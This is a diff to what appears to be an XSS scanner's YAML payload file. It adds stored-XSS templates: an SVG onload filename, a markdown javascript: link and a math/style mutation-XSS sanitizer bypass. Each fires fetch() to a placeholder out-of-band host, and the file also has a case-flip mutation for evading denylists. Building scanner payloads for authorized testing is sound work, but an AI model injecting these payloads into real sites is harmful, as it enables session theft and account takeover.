@@ -26,6 +26,18 @@ payloads:
     template: "<script src=data:text/javascript,fetch('//{oast_host}/{canary}')></script>"
     confidence: suspected
     notes: "Script src=data: URI with inline fetch; bypasses src-domain allowlists."
+  - id: filename_svg_stored
+    template: "<svg onload=fetch('//{oast_host}/{canary}')>.png"
+    confidence: suspected
+    notes: Stored XSS via uploaded filename rendered unescaped on a file-listing/admin page.
+  - id: markdown_js_link
+    template: "[{canary}](javascript:fetch('//{oast_host}/{canary}'))"
+    confidence: suspected
+    notes: "Markdown-rendered javascript: link; fires when a wiki/README/comment renderer passes href through unsanitized."
+  - id: math_style_mxss_stored
+    template: "<math><style><img src=x onerror=fetch('//{oast_host}/{canary}')></style></math>"
+    confidence: suspected
+    notes: Mutation-XSS tag-combination (math+style) bypass surviving a storage-then-render sanitizer pass.
 mutations:
   - name: case_flip
     description: Flip case of tag/handler names to bypass case-sensitive tag denylists.
